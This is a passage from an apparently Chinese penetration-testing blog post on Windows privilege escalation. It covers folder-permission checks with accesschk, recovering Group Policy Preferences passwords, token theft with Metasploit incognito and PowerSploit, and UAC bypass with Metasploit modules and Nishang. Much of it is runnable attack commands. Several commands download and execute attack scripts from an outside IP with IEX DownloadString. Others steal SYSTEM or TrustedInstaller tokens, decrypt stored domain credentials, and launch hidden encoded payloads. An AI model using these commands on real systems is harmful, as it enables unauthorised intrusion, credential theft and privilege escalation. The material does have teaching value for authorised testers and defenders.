<p>可以看出accesschk称得上是查找有权限配置缺陷文件夹的必备工具，下面是accesschk的一些其他使用实例。</p>
<p>当第一次执行任何sysinternals工具包里的工具时，当前用户将会看到一个最终用户许可协议弹框，这是一个大问题，然而我们可以添加一个额外的参数“&#x2F;accepteula”去自动接受许可协议，即：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe /accepteula</span><br></pre></td></tr></table></figure>

<p>Accesschk可以自动的检查当我们使用一个特定的用户时，我们是否对Windows的某个服务有写的权限。当我们作为一个低权限用户，我们首先就想要看一下“Authenticated Users”组对这些服务的权限。</p>
<p>找出某个驱动器下所有权限配置有缺陷的文件夹路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwdqs Users c:\</span><br><span class="line">accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\</span><br></pre></td></tr></table></figure>

<p>找出某个驱动器下所有权限配置有缺陷的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwqs Users c:\*.*</span><br><span class="line">accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*</span><br></pre></td></tr></table></figure>

<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021725234.png" alt="image-20231002172552184"></p>
<p>如上图可以看到对这个目录下的每一个文件它都列出了Authenticated Users用户组的权限，R为读权限，W为写权限，RW表示有读写权限，如果前面为空则表示没有权限。</p>
<p>根据前面这几个提权的思路，当我们检查文件或文件夹权限的时候，需要考虑哪些点事易受攻击的点。</p>
<p>你需要花费时间来检查所有的启动路径，Windows服务，计划任务和Windows启动项等</p>
<h2 id="Windows组策略首选项提权"><a href="#Windows组策略首选项提权" class="headerlink" title="Windows组策略首选项提权"></a>Windows组策略首选项提权</h2><p>SYSVOL是活动目录里面的一个用于<strong>存储公共文件服务器副本</strong>的共享文件夹，在域中的所有域控制器之间进行复制。SYSVOL文件夹是在安装活动目录时自动创建的，主要用来存<strong>放登录脚本、组策略数据及其他域控制器需要的域信息</strong>等。SYSVOL在所有经过身份验证的域用户或者域信任用户范围内共享，都可以读取。整个SYSVOL目录在所有的域控制器中是自动同步共享的，所有的域策略均存放在C:\Windows\SYSVOL\DOMAIN\Policies\ 目录中。</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021726263.png" alt="image-20231002172650199"></p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021727516.png" alt="image-20231002172702461"></p>
<p>在一般的域环境中，所有机器都是脚本化批量部署的，数据量通常很大。为了方便地对所有的机器进行操作，<strong>网络管理员往往会使用域策略进行统一的配置和管理</strong>。大多数组织在创建域环境后，会要求加入域的计算机使用域用户密码进行登录验证。为了保证本地管理员密码的安全性，这些组织的网络管理员往往会利用组策略去批量修改本地管理员密码。<strong>但是这样就会出现一个问题，所有机器的本地管理员密码是相同的。攻击者获得了一台机器的本地管理员密码，就相当于获得了整个域中所有机器的本地管理员密码，黑客就可以获取他们所有机器的管理权限。</strong></p>
<p><strong>管理员在域中新建一个组策略批量修改域中机器的本地管理员密码后，操作系统会自动在SYSVOL共享目录中生成一个XML文件，该文件中保存了该组策略更新后的密码。</strong>该密码使用AES-256加密算法，安全性还是比较高的。但是，2012年微软在官方网站上公布了该密码的私钥，导致保存在XML文件中的密码的安全性大大降低。由于任何域用户和域信任的用户均可对该共享目录进行访问，这就意味着，任何用户都可以访问保存在XML文件中的密码并将其解密，从而控制域中所有使用该账号、密码的本地管理员计算机</p>
<p>我们可以在SYSVOL中搜索包含cpassword获取组策略的凭据。</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021728676.png" alt="image-20231002172821624"></p>
<p>如上图可以看到其中的cpassword项，保存的是加密后的内容，加密方式为AES 256，虽然目前AES 256很难被攻破，但是微软选择公开了该AES 256加密的私钥，地址如下：</p>
<p><a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/cc422924.aspx">https://msdn.microsoft.com/en-us/library/cc422924.aspx</a></p>
<p>借助该私钥，我们就能还原出明文</p>
<h3 id="PowerShell下的利用"><a href="#PowerShell下的利用" class="headerlink" title="PowerShell下的利用"></a>PowerShell下的利用</h3><p>即PowerSploit中的Get-GPPPassword.ps1脚本</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1</a></p>
<p>PowerSploit中的Get-GPPPassword.ps1脚本可以获取组策略中的明文密码，这里不仅找到了包含cpassword获取组策略的凭据，并且将其中AES 256加密的明文密码还原了出来。</p>
<p>注意，我们只需要在域内任何一台以域用户权限登录的机器上均可查询到。</p>
<p>使用方法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass IEX(New-ObjectNet.WebClient).DownloadString(&#x27;http://39.xxx.xxx.210/powersploit/Exfiltration/Get-GPPPassword.ps1&#x27;);Get-GPPPassword</span><br></pre></td></tr></table></figure>

<h3 id="Metasploit下的利用"><a href="#Metasploit下的利用" class="headerlink" title="Metasploit下的利用"></a>Metasploit下的利用</h3><p>Metasploit下的相关模块为post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp，该模块可以获取组策略中的密码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/gather/credentials/gpp</span><br><span class="line">set session xxx</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<h2 id="Windows令牌窃取"><a href="#Windows令牌窃取" class="headerlink" title="Windows令牌窃取"></a>Windows令牌窃取</h2><p>令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许某次请求和判断某次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌除非系统重新启动，否则将持续存在于系统中。令牌最大的特点就是随机性，不可预测，一般的黑客攻击者或软件无法猜测出令牌。</p>
<p>令牌(Token)有很多种：</p>
<blockquote>
<p>访问令牌(Access Token)：表示访问控制操作主体的系统对象</p>
<p>会话令牌(Session Token)：是交互会话中唯一的身份标识符</p>
<p>密保令牌(Security Token)：又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备，例如U盾</p>
</blockquote>
<p>伪造令牌攻击的核心是Kerberos协议。Kerberos认证过程详情请见大佬文章：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/13758c310242%EF%BC%8C%E8%BF%99%E9%87%8C%E5%86%99%E7%9A%84%E5%8D%81%E5%88%86%E8%AF%A6%E7%BB%86%E4%BA%86%E3%80%82">https://www.jianshu.com/p/13758c310242，这里写的十分详细了。</a></p>
<p>假冒令牌可以假冒一个网络中的另一个用户进行各类类操作。所以当一个攻击者需要域管理员的操作权限时候，需要通过假冒域管理员的令牌进行攻击。</p>
<h3 id="Metasploit下的令牌窃取"><a href="#Metasploit下的令牌窃取" class="headerlink" title="Metasploit下的令牌窃取"></a>Metasploit下的令牌窃取</h3><p>需要我们已经获取了目标主机一个administrator权限的meterpreter，需要提前至system，我们可以用metasploit的incognito模块窃取令牌</p>
<p>如下，输入 <code>use incognito</code> 来先加载incognito模块，然后输入<code>list_tokens -u</code> 命令即可列出可用的访问令牌：</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021728708.png" alt="image-20231002172837563"></p>
<p>可以看到，这里的Windows访问令牌有两种类型：</p>
<blockquote>
<p><strong>Delegation Token</strong>：授权令牌，它支持交互式会话登录(例如本地用户直接登录、远程桌面登录访问)</p>
<p><strong>Impresonation Token</strong>：模拟令牌，它是非交互的会话(例如使用net use访问共享文件夹)。</p>
</blockquote>
<p><strong>注：</strong>两种token只在系统重启后清除 具有 Delegation token 的用户在注销后，该Token将变成Impersonation token ，依旧有效。</p>
<p>这里，我们可以看到列出了三个授权令牌，我们执行如下命令，就可以伪造NT AUTHORITY\SYSTEM令牌，来模拟SYSTEM用户了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021729757.png" alt="image-20231002172919654"></p>
<p>注意： <code>list_tokens -u</code> 命令列出的令牌取决于你获得的meterpreter的访问级别，这里我们测试的是管理员权限到system权限，如果我们获取的用户不是管理员而是普通用户权限，也有可能列出相应的高权限令牌。</p>
<p>此外，我们还可以利用 steal_token <pid> 命令从相应的进程中窃取令牌。先执行 ps 找到User为SYSTEM或管理员的进程，并记下其进程的PID，然后执行 steal_token <pid> ：</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021729060.png" alt="image-20231002172934952"></p>
<p>Metasploit incognito模块的相关命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getuid # 查看当前令牌(token)</span><br><span class="line">use incognito # 加载incognito模块</span><br><span class="line">list_tokens -u # 列出访问令牌</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot; #模拟system用户，getsystem命令即实现了该命令。如果要模拟其他用户，将token名改为其他用户即可</span><br><span class="line">steal_token 1252 # 从进程窃取token</span><br><span class="line">getsystem # 提升至system权限</span><br><span class="line">rev2self # 返回到之前的AccessToken权限</span><br></pre></td></tr></table></figure>

<h3 id="incognito-exe工具下的令牌窃取"><a href="#incognito-exe工具下的令牌窃取" class="headerlink" title="incognito.exe工具下的令牌窃取"></a>incognito.exe工具下的令牌窃取</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</a></p>
<p>incognito.exe工具也可以用来进行令牌窃取。</p>
<p>首先在目标主机上上传incognito.exe：</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021729647.png" alt="image-20231002172947524"></p>
<p>然后进入shell，执行如下命令列举存在的访问令牌：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe list_tokens -u</span><br></pre></td></tr></table></figure>

<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021730099.png" alt="image-20231002173001855"></p>
<p>然后我们就可以通过执行如下命令窃取令牌来模拟其他用户：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe execute -c &quot;完整的Token名称&quot; &lt;要执行的命令&gt;</span><br><span class="line">例如执行whoami命令：</span><br><span class="line">incognito.exe execute -c &quot;完整的Token名称&quot; whoami</span><br><span class="line"></span><br><span class="line">例如：模拟SYSTEM权限用户：</span><br><span class="line">incognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe</span><br><span class="line">降权至当前用户：</span><br><span class="line">incognito.exe execute -c &quot;当前用户token&quot; cmd.exe</span><br></pre></td></tr></table></figure>

<p>但是这里由于我们是在meterpreter的shell中执行的系统命令，其没有回显(时间好长啊)，我们可以直接上传一个msf马和incognito.exe，然后利用窃取的令牌所获得的system权限来执行我们所上传的msf马，从而从新获得一个system权限的meterpreter，如下图，成功获得了一个system权限的meterpreter：</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021730178.png" alt="image-20231002173034113"></p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021731409.png" alt="image-20231002173112204"></p>
<h3 id="Rotten-Potato工具下的令牌窃取"><a href="#Rotten-Potato工具下的令牌窃取" class="headerlink" title="Rotten Potato工具下的令牌窃取"></a>Rotten Potato工具下的令牌窃取</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/foxglovesec/RottenPotato">https://github.com/foxglovesec/RottenPotato</a></p>
<p>见上面的烂土豆</p>
<h3 id="PowerShell下的令牌窃取"><a href="#PowerShell下的令牌窃取" class="headerlink" title="PowerShell下的令牌窃取"></a>PowerShell下的令牌窃取</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1</a></p>
<p>Invoke-TokenManipulation.ps1脚本是PowerSploit中Exfiltration文件夹内的一个脚本。</p>
<p>首先执行如下命令列举token:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&#x27;http://39.xxx.xxx.210/powersploit/Exfiltration/Invoke-TokenManipulation.ps1&#x27;);Invoke-TokenManipulation -Enumerate</span><br></pre></td></tr></table></figure>

<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021731905.png" alt="image-20231002173132830"></p>
<p>如上图，成功列举出了token。然后执行如下命令窃取system的token：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -Username &quot;nt AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021731315.png" alt="image-20231002173149261"></p>
<p>如上图，执行命令后，成功弹出了一个system权限的shell。</p>
<p>不仅如此，我们还可以从进程中窃取令牌token，首先查看高权限的进程：</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021732749.png" alt="image-20231002173200695"></p>
<p>然后执行如下命令从进程中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -ProcessId 2504</span><br></pre></td></tr></table></figure>

<p>如下图，成功：</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021732832.png" alt="image-20231002173210778"></p>
<h3 id="利用令牌获得TrustedInstaller权限"><a href="#利用令牌获得TrustedInstaller权限" class="headerlink" title="利用令牌获得TrustedInstaller权限"></a>利用令牌获得TrustedInstaller权限</h3><p>有时候，在Windows系统中即使获得了管理员权限和SYSTEM权限，也不能修改系统文件，因为Windows系统的最高权限为 TrustedInstaller 权限。</p>
<p>例如 <code>C:\Windows\servicing</code>路径，即使使用SYSTEM权限也无法在该路径进行读写文件：</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021732501.png" alt="image-20231002173221452"></p>
<p>当我们启动TrustedInstaller服务时会启动进程TrustedInstaller.exe，位置位于<code>C:\Windows\servicing\TrustedInstaller.exe</code> ，我们可以用 Get-Acl 查看该程序的权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-Acl -Path C:\Windows\servicing\TrustedInstaller.exe</span><br><span class="line">Get-Acl -Path C:\Windows\servicing\TrustedInstaller.exe |select Owner</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Powershell中有一个Get-Acl命令，这个命令是用来获取资源安全描述的命令，可以用来查看文件的权限。</p>
</blockquote>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021732645.png" alt="image-20231002173233597"></p>
<p>我们可以看到该程序的权限(所属用户)为NT SERVICE\TrustedInstaller。</p>
<p>那我们的思路就是，借用TrustedInstaller.exe的token令牌创建子进程，这样子进程就有了TrustedInstaller权限。</p>
<p>思路如下：</p>
<blockquote>
<p>启动服务TrustedInstaller</p>
<p>使用incognito获取TrustedInstaller.exe的token</p>
<p>获得TrustedInstaller权限</p>
</blockquote>
<p><strong>（1）在metasploit的incognito模块下测试（已获得一个管理员权限的meterpreter）</strong></p>
<p>首先进入shell启动TrustedInstaller服务：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe start TrustedInstaller # 先进入shell启动TrustedInstaller服务</span><br></pre></td></tr></table></figure>

<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021732443.png" alt="image-20231002173246268"></p>
<p>然后执行如下即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">ps # 找到TrustedInstaller的进程PID，这里为2180</span><br><span class="line">steal_token &lt;PID&gt; # 从该进程中窃取令牌</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>

<p>可以看到在窃取TrustedInstaller的令牌前，对C:\Windows\servicing目录没有写权限：</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021733431.png" alt="image-20231002173302258"></p>
<p>而窃取TrustedInstaller的令牌后，对C:\Windows\servicing目录就有了写权限：</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021733052.png" alt="image-20231002173314903"></p>
<p><strong>（2）在PowerShell下使用Invoke-TokenManipulation.ps1脚本测试</strong></p>
<p>代码执行如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sc.exe start TrustedInstaller # 启动TrustedInstaller服务</span><br><span class="line"></span><br><span class="line">$id = Get-Process -name TrustedInstaller* | Select-Object id | ForEach-Object -Process&#123;$_.id&#125;</span><br><span class="line"></span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(&#x27;http://39.101.219.210/powersploit/Exfiltration/Invoke-TokenManipulation.ps1&#x27;);Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -ProcessId $id</span><br></pre></td></tr></table></figure>

<p>窃取TrustedInstaller的令牌后，对C:\Windows\servicing目录就有了写权限：</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021733183.png" alt="image-20231002173329094"></p>
<p>这里，在成功窃取TrustedInstaller的令牌后会发现自己的权限仍是NT AUTHORITY\SYSTEM，这是因为TrustedInstaller权限也会显示为NT AUTHORITY\SYSTEM，执行下面这个命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /groups | findstr TrustedInstaller</span><br></pre></td></tr></table></figure>

<p>如果有回显，代表当前是TrustedInstaller权限：</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021734216.png" alt="image-20231002173409153"></p>
<h2 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h2><p>UAC，即用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。</p>
<p>使用 UAC，应用程序和任务总是在非管理员帐户的安全上下文中运行，但管理员专门给系统授予管理员级别的访问权限时除外。UAC 会阻止未经授权应用程序的自动安装，防止无意中对系统设置进行更改。</p>
<p><strong>UAC如何运行？</strong></p>
<p>UAC通过阻止程序执行任何涉及有关系统更改&#x2F;特定任务的任务来运行。除非尝试执行这些操作的进程以管理员权限运行，否则这些操作将无法运行。如果您以管理员身份运行程序，则它将具有更多权限，因为它将被“提升权限”，而不是以管理员身份运行的程序。</p>
<h3 id="Metasploit下的绕过UAC提权"><a href="#Metasploit下的绕过UAC提权" class="headerlink" title="Metasploit下的绕过UAC提权"></a>Metasploit下的绕过UAC提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/local/ask # 弹出UAC确认窗口，然后诱使用户点击后获得system权限</span><br><span class="line"></span><br><span class="line">exploit/windows/local/bypassuac # 此模块将通过进程注入使用可信任发布者证书绕过Windows UAC。它将生成关闭UAC的第二个shell。</span><br><span class="line"></span><br><span class="line">exploit/windows/local/bypassuac_injection # 此模块将通过进程注入使用可信任的发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。</span><br><span class="line"></span><br><span class="line">exploit/windows/local/bypassuac_fodhelper # 此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10的UAC。它将生成关闭UAC标志的第二个shell。</span><br><span class="line"></span><br><span class="line">exploit/windows/local/bypassuac_eventvwr # 此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows事件查看器时调用的自定义命令来绕过Windows UAC。它将生成关闭UAC标志的第二个shell。</span><br><span class="line"></span><br><span class="line">exploit/windows/local/bypassuac_comhijack # 此模块将通过在hkcu配置单元中创建COM处理程序注册表项来绕过Windows UAC。</span><br></pre></td></tr></table></figure>

<p>以上模块都是从meterpreter中设置好session执行完后，绕过UAC，获得一个关闭了UAC的第二个shell，再在这个关闭了UAC的第二个shell中执行 getsystem 即可完成提权。</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021734294.png" alt="image-20231002173430063"></p>
<h3 id="PowerShell下的绕过UAC提权"><a href="#PowerShell下的绕过UAC提权" class="headerlink" title="PowerShell下的绕过UAC提权"></a>PowerShell下的绕过UAC提权</h3><p>即利用Nishang中Escalation目录下的Invoke-PsUACme.ps1脚本。</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
<p>执行如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass IEX(New-Object Net.WebClient).DownloadString(&#x27;http://39.xxx.xxx.210/nishang/Escalation/Invoke-PsUACme.ps1&#x27;);Invoke-PsUACme -Verbose # 使用sysprep方法并执行默认的payload</span><br><span class="line"></span><br><span class="line">Invoke-PsUACme -method oobe -verbose # 使用oobe方法并执行默认的payload</span><br></pre></td></tr></table></figure>

<p>如下图，执行完后会弹出一个具有管理员权限的shell：</p>
<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021734707.png" alt="image-20231002173448640"></p>
<p>还可以使用 -Payload 参数自行指定要执行的Payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PsUACme -method oobe -verbose -Payload &quot;powershell -windowstyle hidden -e YourBase64EncodedPayload&quot;</span><br></pre></td></tr></table></figure>

<p>即可在绕过UAC后以高权限执行后面的powershell代码。</p>
<p>还可以使用 -PayloadPath 参数自行指定要执行的Payload的路径：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PsUACme -method oobe -verbose -PayloadPath &lt;路径&gt;</span><br></pre></td></tr></table></figure>

<p>我们可以利用这个来在绕过UAC后以高权限执行后面的msf马，以获得管理员权限的meterpreter。</p>
<p>除了以上那些绕过UAC的方法外，我们还可以利用CVE-2019-1388等漏洞来绕过，该漏洞位于Windows的UAC机制中。默认情况下，Windows会在一个单独的桌面上显示所有的UAC提示——SecureDesktop。这些提示是由名为consent.exe的可执行文件产生的，该可执行文件以NT AUTHORITY\SYSTEM权限运行，完整性级别为System。因为用户可以与该UI交互，因此对UI来说紧限制是必须的。否则，低权限的用户可能可以通过UI操作的循环路由以SYSTEM权限执行操作。即使隔离状态的看似无害的UI特征都可能会成为引发任意控制的动作链的第一步。事实上，UAC会话中含有尽可能少的点击操作选项。利用该漏洞很容易就可以提升权限到SYSTEM。</p>
<blockquote>
<p>详情请见：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/sun1318578251/article/details/103325724">https://blog.csdn.net/sun1318578251/article/details/103325724</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/mQqCuH6xOvYJC8-C0aRe4w">https://mp.weixin.qq.com/s/mQqCuH6xOvYJC8-C0aRe4w</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://cjb12.github.io/project/2023/04/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88Windows%E7%AF%87%EF%BC%89/" data-id="cln8p3qxg0004d4tgcl5jf262" data-title="内网渗透之权限提升（Windows篇）" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/project/2023/04/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88Linux%E7%AF%87%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">内网渗透之权限提升（Linux篇）</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2023/01/">January 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2022/04/">April 2022</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/project/2023/04/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88Windows%E7%AF%87%EF%BC%89/">内网渗透之权限提升（Windows篇）</a>
          </li>
        
          <li>
            <a href="/project/2023/04/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88Linux%E7%AF%87%EF%BC%89/">内网渗透之权限提升（Linux篇）</a>
          </li>
        
          <li>
            <a href="/project/2023/04/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">内网渗透之权限维持</a>
          </li>
        
          <li>
            <a href="/project/2023/04/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">内网渗透之信息收集</a>
          </li>
        
          <li>
            <a href="/project/2023/03/06/MySQL%E5%86%99Shell/">MySQL写Shell</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2023 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/project/" class="mobile-nav-link">Home</a>
  
    <a href="/project/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/project/js/jquery-3.6.4.min.js"></script>



  
<script src="/project/fancybox/jquery.fancybox.min.js"></script>




<script src="/project/js/script.js"></script>





  </div>
</body>
</html>